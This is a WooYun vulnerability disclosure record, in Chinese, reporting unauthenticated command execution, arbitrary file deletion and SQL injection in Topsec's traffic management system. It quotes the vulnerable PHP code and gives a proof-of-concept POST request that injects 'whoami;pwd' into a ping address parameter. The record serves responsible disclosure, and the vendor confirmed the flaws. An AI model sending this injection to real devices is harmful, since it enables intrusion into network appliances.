{"id": 86848, "wybug_id": "wooyun-2016-0176856", "wybug_title": "天融信流量管理系统存在命令执行&amp;SQL注入（无需登录）", "wybug_corp": "天融信", "wybug_author": "路人甲", "wybug_date": "2016-02-19 10:06", "wybug_open_date": "2016-05-19 11:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向公众公开  简要描述： 我也来凑个热闹天融信流量管理系统多个高危漏洞打包（无需登录），包括多个任意命令执行、任意文件删除漏洞 详细说明：  天融信异常流量管理与抗拒绝服务系统存在漏洞的文件为：\n命令执行/modules/system/diagnose.mds.php/modules/ads/ads_report_upload.mds.php（重复）文件删除/modules/ads/ads_capture_tcpdump.mds.php（重复）注入漏洞/modules/page/log_data.mds.php\n部份源代码为：/modules/ads/ads_capture_tcpdump.php\nif($post_submit_action == \"adscapture_tcpdump_delete_pcap\"){    $pcap_name = $_POST[\"pcap_name\"];    $file = \"/SE/ads_tcpdump/\".$pcap_name;    unlink($file);    return;}\npost参数pcap_name进入了unlink函数，直接的任意文件删除漏洞命令执行 /modules/system/diagnose.mds.php\nif($action=='diagnose_begin'){\t\t$to_ping = formatpost($_POST['addr']);\t$operation=formatpost($_POST['operation']);\tif($_POST['type']==1){\t\t$ping_count = 5;\t\tunlink(\"/tmp/ping_\" . $_SESSION['auth_id'] . \".txt\");\t\tif($operation == 4){\t\t\t$command = \"ping -W 1 -c \" . $ping_count . \" \" . $to_ping . \" &>/tmp/ping_\" . $_SESSION['auth_id'] . \".txt &\";\t\t}\t\telse if($operation == 6){\t\t\t$command = \"ping6 -W 1 -c \" . $ping_count . \" \" . $to_ping . \" &>/tmp/ping_\" . $_SESSION['auth_id'] . \".txt &\";\t\t}\t\texec ( $command );\t\techo json_encode(array('success'=>true,'result_string'=>file_get_contents(\"/tmp/ping_\" . $_SESSION['auth_id'] . \".txt\")));\t\texit;\t}}\n这个不多说更简单明了的命令执行漏洞sql注入  /modules/page/log_data.mds.php\nif($action == 'login_log'){    $page = $_REQUEST['page'] ? $_REQUEST['page'] : 1;    $pagesize = $_REQUEST['group'] ? $_REQUEST['group'] : 20;    $page = ($page - 1) < 0 ? 0 : ($page - 1) * $pagesize;    $sql = \"select user,src,login_method,msg,time from \" . $log_table . \" where vsid = \". $vsysid .\" and recorder = 'mgmt' order by time desc limit $page , $pagesize\";    $arr = $db_log->select($sql);    $logs = array();    foreach ($arr as $key => $val) {        $logs[$key]['user'] = $val['user'];        $logs[$key]['time'] = $val['time'];        $logs[$key]['login_method'] = $val['login_method'];        $logs[$key]['src'] = $val['src'];        $logs[$key]['msg'] = $val['msg'];    }    $tmparr['group'] = $logs;    $sql2 = \"select msg as count from \" . $log_table . \" where vsid = \". $vsysid .\" and recorder = 'mgmt'\";    $count = $db_log->get_num_rows($sql2);    $tmparr['page'] = array('total' => $count);    echo json_encode($tmparr);    return;}\nrequest参数group直接进入了sql查询，造成了sql注入   漏洞证明：  由于这几个漏洞均非常简单，选取命令执行来作漏洞证明可直接访问：\n/?module=system_diagnose&action=diagnose_beginPOST提交：operation=4&addr=whoami;pwd\n0x1 **.**.**.**/\n\n0x2 **.**.**.**/\n\n0x3 **.**.**.**/\n\n其他的案例：\n**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-02-19 11:20 厂商回复： 已确认，谢谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-19 10:12 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:768 漏洞数:83        | root@qisec.com)\t\t \n  玩坏了    \n     2016-02-22 15:16 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 你猜)\t\t \n  玩坏了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}